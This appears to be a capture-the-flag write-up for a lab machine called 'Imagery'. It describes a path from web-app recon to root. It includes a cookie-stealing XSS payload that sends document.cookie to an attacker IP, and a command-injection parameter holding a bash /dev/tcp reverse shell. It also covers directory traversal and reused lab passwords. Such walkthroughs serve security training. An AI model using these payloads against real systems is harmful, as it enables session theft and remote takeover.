+++
title = 'Imagery'
description = 'Medium Linux'
writeup = true
hideMeta = true
+++

nmap scan.

![Imagery (Medium Linux).png](Imagery%20%28Medium%20Linux%29.png)

SSH and HTTP on 8000. The SSH version is quite new, so unlikely to have exploitable vulns - let's go to the web app.

Web app running Werkzeug 3.1.3 and Python 3.12.7.

It's a gallery app where you can register/login. I made an account:

`hacker@imagery.com` / `hacker`

You can upload images and see them in your gallery. Playing around, it's basically a single page app making calls to the server that return JSON.

So I messed with the POST request for `/upload_image`:

![Imagery (Medium Linux)-1.png](Imagery%20%28Medium%20Linux%29-1.png)

The app doesn't check that the actual content is an image - it only checks the extension. It also allowed me to upload to other directories (this image doesn't show up in the gallery, my assumption is it errored).

So - if I upload a key into the `.ssh` folder, I should be able to SSH into the box?

When we upload a legit file it goes to `/uploads/<IMAGEID>_<ORIGINALFILENAME>.jpg`:

![Imagery (Medium Linux)-2.png](Imagery%20%28Medium%20Linux%29-2.png)
![Imagery (Medium Linux)-3.png](Imagery%20%28Medium%20Linux%29-3.png)

My thinking: is there a way to upload a web shell with any of these extensions? We can upload stuff so it works.

*CLUE FROM JOREL - it's not file upload! Look at the javascript.*

Reading the javascript, there's an adminPanel and the user has to have `isAdmin` set to True to access it:

![Imagery (Medium Linux)-4.png](Imagery%20%28Medium%20Linux%29-4.png)
![Imagery (Medium Linux)-5.png](Imagery%20%28Medium%20Linux%29-5.png)

This is clearly the request that checks the auth state of the user - all the security is client side in the javascript, so we can simply modify the response coming back.

Setting `isAdmin` in the response works - but I can't access the users list. Looking at the javascript, it's because `/admin/users` - a call is made and the response contains the info; the only thing being sent is the cookie.

So the check on whether the user can do these things lies in the cookie.

```
HTTP/1.1 200 OK
Server: Werkzeug/3.1.3 Python/3.12.7
Date: Wed, 01 Oct 2025 06:37:31 GMT
Content-Type: application/json
Content-Length: 105
Vary: Cookie
Set-Cookie: session=.eJxNjTEKhEAMRe-SWkRBcLFaS08xhJmoQZORyVjIsnfftVAs33sf_gcC27biMQTooHo1dYtVCwWw9UFYoRtxNTrZsWyULCpm1sllsrwbpeficg69j7vmu51SUej_MaNfKL1ZcKJ0lD4KfH9EwjAE.aNzMKw.cNLfdEa3BUoRY7z60yvsCwuC4sA; Path=/
Connection: close

{
	"displayId":"08417a07",
	"isAdmin":false,
	"isTestuser":false,
	"message":"Login successful.",
	"success":true
}
```

```
# endpoints
/auth_status?t=${new Date().getTime()} - gets permission

/register - add user to database
/login - sets session cookie
/logout - clears cookie
/images - shows images (json)
/delete_image - 
/edit_image_details - not yet implemented
/convert_image - not yet implemented

/apply_visual_transform
/delete_image_metadata
/report_bug

/admin/bug_reports
/admin/delete_bug_report
/admin/delete_user
/admin/users

/get_image_collections
/create_image_collection
/move_images_to_collection
```

`{"displayId":"08417a07","isAdmin":false,"is_impersonating_testuser":false,"is_testuser_account":false,"username":"hacker@imagery.com"}`.

Looking through `/report_bug`:

![Imagery (Medium Linux)-6.png](Imagery%20%28Medium%20Linux%29-6.png)

`report.details` is not sanitised. There's also a message saying "admin review in progress" when we report a bug - so we can put an XSS payload here and steal the admin cookie:

```html
# xss payload
<img src=x onerror="fetch('http://10.10.16.196/?cookie='+document.cookie)" />
```

We obtain the admin cookie:

![Imagery (Medium Linux)-7.png](Imagery%20%28Medium%20Linux%29-7.png)

`session=.eJw9jbEOgzAMRP_Fc4UEZcpER74iMolLLSUGxc6AEP-Ooqod793T3QmRdU94zBEcYL8M4RlHeADrK2YWcFYqteg571R0EzSW1RupVaUC7o1Jv8aPeQxhq2L_rkHBTO2irU6ccaVydB9b4LoBKrMv2w.aNzobw.8BDI3agM4PsQ-47oouktdCell1k`

With this we can see the features of the admin panel. We can "download log" - the GET request for this has a directory traversal vulnerability.

![Imagery (Medium Linux)-8.png](Imagery%20%28Medium%20Linux%29-8.png)

The interesting users on the box:

```
root
web
mark
dhcpcd
```

We only have directory traversal and can't really upload files, so let's map out the Flask app's python files. We cause an error by accessing a file we can't, which leaks a path:

![Imagery (Medium Linux)-9.png](Imagery%20%28Medium%20Linux%29-9.png)

`/home/web/web/app.py` - in the code above we can see `{user_entry['username']}` is something we control.

`/home/web/web/templates/index.html` exists and is the main page.

`/home/web/web/config.py` - looking at it, there's a `db.json` file. We also see `application/pdf` and the `pdf` extension are allowed, and there are `/uploads/admin/converted` and `/uploads/admin/transformed` paths.

![Imagery (Medium Linux)-10.png](Imagery%20%28Medium%20Linux%29-10.png)

We have the password for `testuser@imagery.htb` - let's see if there's anything different with this account.

`iambatman`

With this account we can hit the "under development" API endpoints.

Looking at the imports for app.py, there's a utils.py: `/home/web/web/utils.py`

![Imagery (Medium Linux)-12.png](Imagery%20%28Medium%20Linux%29-12.png)

```json
// post request to /apply_visual_transform

{
	"imageId":"c9ed35a8-5614-4d41-a6b9-7201391e60bf",
	"transformType": "crop",
	"params":{
		"width":"100",
		"height":"100",
		"x":"1",
		"y":";bash -c 'bash -i >& /dev/tcp/10.10.16.196/9000 0>&1'"
	}
}
```

![Imagery (Medium Linux)-11.png](Imagery%20%28Medium%20Linux%29-11.png)

Possible privesc vectors:

![Imagery (Medium Linux)-13.png](Imagery%20%28Medium%20Linux%29-13.png)

![Imagery (Medium Linux)-14.png](Imagery%20%28Medium%20Linux%29-14.png)

![Imagery (Medium Linux)-15.png](Imagery%20%28Medium%20Linux%29-15.png)
![Imagery (Medium Linux)-16.png](Imagery%20%28Medium%20Linux%29-16.png)

Got the `admin@imager.htb` password but don't know if that helps.

![Imagery (Medium Linux)-17.png](Imagery%20%28Medium%20Linux%29-17.png)

`strongsandofbeach`

Looking around more, there's a backup `.zip.aes` file in `/var/backup`. Brought it back to the Kali VM - there's a password on the encrypted file, so let's write a script to brute force it.

![Imagery (Medium Linux)-18.png](Imagery%20%28Medium%20Linux%29-18.png)

![Imagery (Medium Linux)-19.png](Imagery%20%28Medium%20Linux%29-19.png)

`bestfriends`

We get a backup version of the web app - looking in db.json:

![Imagery (Medium Linux)-20.png](Imagery%20%28Medium%20Linux%29-20.png)

We have both mark and web passwords:

![Imagery (Medium Linux)-21.png](Imagery%20%28Medium%20Linux%29-21.png)

`mark:supersmash`
`web:spiderweb1234`

Used them to switch to mark.

![Imagery (Medium Linux)-22.png](Imagery%20%28Medium%20Linux%29-22.png)
![Imagery (Medium Linux)-23.png](Imagery%20%28Medium%20Linux%29-23.png)

`sudo -l` shows the `charcol` binary can run as root with no password as mark.

We can start a charcol shell.

![Imagery (Medium Linux)-24.png](Imagery%20%28Medium%20Linux%29-24.png)

Seeing in the help we can create cron jobs - create a reverse shell cron job.

Catch it.

![Imagery (Medium Linux)-25.png](Imagery%20%28Medium%20Linux%29-25.png)

Pwned!
